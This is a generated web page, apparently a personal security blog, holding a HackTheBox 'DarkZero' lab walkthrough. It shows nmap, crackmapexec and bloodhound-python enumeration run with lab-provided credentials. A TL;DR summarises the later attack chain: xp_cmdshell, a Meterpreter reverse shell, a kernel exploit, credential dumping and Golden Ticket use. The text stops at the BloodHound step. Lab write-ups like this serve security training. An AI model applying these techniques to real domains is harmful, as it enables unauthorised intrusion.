@@ -1,0 +1,1444 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Breaking into systems, documenting the journey">
+      
+      
+        <meta name="author" content="Certifa">
+      
+      
+        <link rel="canonical" href="https://yourusername.github.io/writeups/htb/darkzero/">
+      
+      
+        <link rel="prev" href="../return/">
+      
+      
+        <link rel="next" href="../../../tools/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>DarkZero - My Security Lab</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.618322db.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../../stylesheets/cards.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="teal">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#hackthebox-darkzero-walkthrough" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="My Security Lab" class="md-header__button md-logo" aria-label="My Security Lab" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Security Lab
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              DarkZero
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Certifa" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Certifa
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+  Writeups
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../tools/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Tools
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../cheatsheets/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Cheatsheets
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../blog/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Blog
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="My Security Lab" class="md-nav__button md-logo" aria-label="My Security Lab" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Security Lab
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Certifa" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Certifa
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HackTheBox
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../return/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Return
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DarkZero
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DarkZero
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#table-of-contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📚 Table of Contents
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔎 Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#about" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📖 About
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚡ TL;DR
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🖥️ SETUP / NOTES
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 RECON
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 ENUMERATION
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💥 EXPLOIT
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛡️ PRIVILEGE ESCALATION
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-thoughts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📎 Final thoughts
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lessons-learned" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📘 LESSONS LEARNED
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📚 REFERENCES
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tools/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tools
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cheatsheets
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Writeups
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../return/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    HackTheBox
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<blockquote>
+<p><strong>Writeup by <a href="https://github.com/Certifa">@Certifa</a></strong>
+🗓️ HTB Machine: <em>DarkZero</em> • 🧠 Difficulty: Hard • 🪟
+ Windows</p>
+</blockquote>
+<h1 id="hackthebox-darkzero-walkthrough">🧠 HackTheBox - DarkZero Walkthrough<a class="headerlink" href="#hackthebox-darkzero-walkthrough" title="Permanent link">&para;</a></h1>
+<p><img src="../../../assets/writeups/darkzero/logo.png" alt="DarkZero logo" style="width: 80%; max-width: 720px; display:block; margin: 2rem auto 2rem auto; border-radius: 18px; box-shadow: 0 2px 28px #0008;" /></p>
+<hr />
+<h2 id="table-of-contents">📚 Table of Contents<a class="headerlink" href="#table-of-contents" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="#-hackthebox---darkzero-walkthrough">🧠 HackTheBox - DarkZero Walkthrough</a></li>
+<li><a href="#-table-of-contents">📚 Table of Contents</a></li>
+<li><a href="#-overview">🔎 Overview</a></li>
+<li><a href="#-about">📖 About</a></li>
+<li><a href="#-tldr">⚡ TL;DR</a></li>
+<li><a href="#️-setup--notes">🖥️ SETUP / NOTES</a></li>
+<li><a href="#-recon">🚀 RECON</a></li>
+<li><a href="#-enumeration">🔍 ENUMERATION</a></li>
+<li><a href="#-exploit">💥 EXPLOIT</a></li>
+<li><a href="#️-privilege-escalation">🛡️ PRIVILEGE ESCALATION</a></li>
+<li><a href="#-final-thoughts">📎 Final thoughts</a></li>
+<li><a href="#-lessons-learned">📘 LESSONS LEARNED</a></li>
+<li><a href="#-references">📚 REFERENCES</a></li>
+</ul>
+<h2 id="overview">🔎 Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<p><strong>Machine: DarkZero</strong></p>
+<p><strong>Difficulty: Hard</strong></p>
+<p><strong>OS: Windows</strong></p>
+<p><strong>Points: 40</strong></p>
+<p><strong>Status: Active</strong></p>
+<hr />
+<h2 id="about">📖 About<a class="headerlink" href="#about" title="Permanent link">&para;</a></h2>
+<p>This walkthrough covers the HackTheBox machine ‘DarkZero’, a Windows Active Directory environment. The box is notable for its focus on unintended attack paths and challenges you to deeply understand Kerberos, MS SQL, and advanced privilege escalation. The approach here is methodical, explaining each major step and rationale.</p>
+<hr />
+<h2 id="tldr">⚡ TL;DR<a class="headerlink" href="#tldr" title="Permanent link">&para;</a></h2>
+<p>Initial access via HTB-provided credentials for john.w / RFulUtONCOL!</p>
+<p>Identified two domains: darkzero.htb &amp; darkzero.ext</p>
+<p>MSSQL server access enables pivoting to DC02.darkzero.ext</p>
+<p>Enabled xp_cmdshell for command execution and established a Meterpreter reverse shell</p>
+<p>Privilege escalation using winPEAS; identified vulnerable kernel32.dll (CVE-2024-30088)</p>
+<p>Exploited the kernel bug for SYSTEM privileges; dumped Administrator creds and used Golden Ticket techniques to obtain root.txt</p>
+<h2 id="setup-notes">🖥️ SETUP / NOTES<a class="headerlink" href="#setup-notes" title="Permanent link">&para;</a></h2>
+<p>Credentials: john.w / RFulUtONCOL!</p>
+<p>Useful tools: nmap, bloodhound-python, crackmapexec, impacket-mssqlclient, msfvenom, winPEAS</p>
+<p>MSSQL authentication requires Windows mode (-windows-auth) and domain credentials</p>
+<p>Time synchronization is crucial: sudo ntpdate <target-ip> to avoid clock skew errors with Kerberos</p>
+<p>Reverse shell and tool upload via Python HTTP server</p>
+<p>Local privilege escalation exploitation requires an existing Meterpreter session</p>
+<hr />
+<h2 id="recon">🚀 RECON<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<p>Starting off, HackTheBox already gave us the user:pass <code>john.w / RFulUtONCOL!</code>, so let's save that somehwere.</p>
+<p>Now, let's run a <code>nmap</code> scan.</p>
+<div class="highlight"><pre><span></span><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-05 12:21 UTC
+Nmap scan report for 10.129.13.116
+Host is up (0.013s latency).
+
+PORT      STATE SERVICE       VERSION
+🟢53/tcp    open  domain        Simple DNS Plus[0m
+🟢88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-05 19:21:19Z)[0m
+🟢135/tcp   open  msrpc         Microsoft Windows RPC[0m
+🟢139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn[0m
+🟢389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)[0m
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+|_ssl-date: TLS randomness does not represent time
+🟢445/tcp   open  microsoft-ds?[0m
+🟢464/tcp   open  kpasswd5?[0m
+🟢593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0[0m
+🟢636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)[0m
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+|_ssl-date: TLS randomness does not represent time
+🟢1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+[0m
+|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: 2025-10-05T19:22:55+00:00; +7h00m00s from scanner time.
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-10-05T18:33:52
+|_Not valid after:  2055-10-05T18:33:52
+🟢2179/tcp  open  vmrdp?[0m
+🟢3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)[0m
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+|_ssl-date: TLS randomness does not represent time
+🟢3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)[0m
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+|_ssl-date: TLS randomness does not represent time
+🟢5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)[0m
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+🟢9389/tcp  open  mc-nmf        .NET Message Framing[0m
+🟢49664/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢49667/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢49670/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0[0m
+🟢49891/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢49921/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢49970/tcp open  msrpc         Microsoft Windows RPC[0m
+🟢61936/tcp open  msrpc         Microsoft Windows RPC[0m
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+| smb2-time:
+|   date: 2025-10-05T19:22:18
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 102.34 seconds
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-05 12:22 UTC
+Nmap scan report for 10.129.13.116
+Host is up (0.015s latency).
+Not shown: 97 open|filtered udp ports (no-response)
+PORT    STATE SERVICE
+🟢53/udp  open  domain
+🟢88/udp  open  kerberos-sec
+🟢123/udp open  ntp
+
+Nmap done: 1 IP address (1 host up) scanned in 1.94 seconds
+</code></pre></div>
+<p>This scan shows us some crucial information, the domain names <code>darkzero.htb</code> and <code>DC01.darkzero.htb</code> and that it is a windows server with a open port <code>1433</code> being <code>mssql</code>. <code>mssql</code> stands for <code>Microsoft Sql</code> and that is good to know.</p>
+<p>Key findings:</p>
+<ul>
+<li>Multiple AD-related services (Kerberos, ldap, SMB, etc.)</li>
+<li>Domain: darkzero.htb (DC01.darkzero.htb)</li>
+<li>MSSQL on port 1433—a great target for lateral movement</li>
+</ul>
+<hr />
+<h2 id="enumeration">🔍 ENUMERATION<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<p>With the information we have we can check some basic things first. We can run tools like <code>crackmapexec</code>, run <code>bloodhound</code> and many more.</p>
+<p>I checked for accessible shares with crackmapexec:</p>
+<p><code>crackmapexec smb 10.129.110.78 -u john.w -p 'RFulUtONCOL!' --shares</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/1.png" /></p>
+<p>Hmm, it found nothing interesting, just the generic shares.</p>
+<p>Let's go to our other tool <code>bloodhound</code>. What BloodHound-python does is it quickly maps Active Directory relationships to reveal hidden attack paths and privilege escalation opportunities.</p>
+<p>Let's collected AD data with:</p>
+<p><code>bloodhound-python -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb -ns 10.129.110.78 -c All</code></p>
+<p><img alt="" src="../../../assets/writeups/darkzero/2.png" /></p>
+<p>We see a couple of things coming by, first we see <code>KRB_AP_ERR_SKEW(Clock skew too great)</code>. Although we have finished it succesfully, let's sync our time with the host because that error indicates a time difference.</p>
+<p><code>sudo ntpdate 10.129.110.78</code></p>
+<p>now when we <code>ls</code> in our directory, we see a bunch of .json files. These we use to upload into <code>Bloodhound</code>.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/3.png" /></p>
+<p>For the server side I use <code>neo4j</code>. So let's run that firts with <code>sudo neo4j start</code>.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/4.png" /></p>
+<p>Now that has been set up, we can run <code>bloodhound</code> by typing it directly into the terminal. You will be greeted with a login screen.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/5.png" /></p>
+<p>When logged in, click the 3rd option to import the json.</p>
+<p><img alt="" src="../../../assets/writeups/darkzero/6.png" /></p>
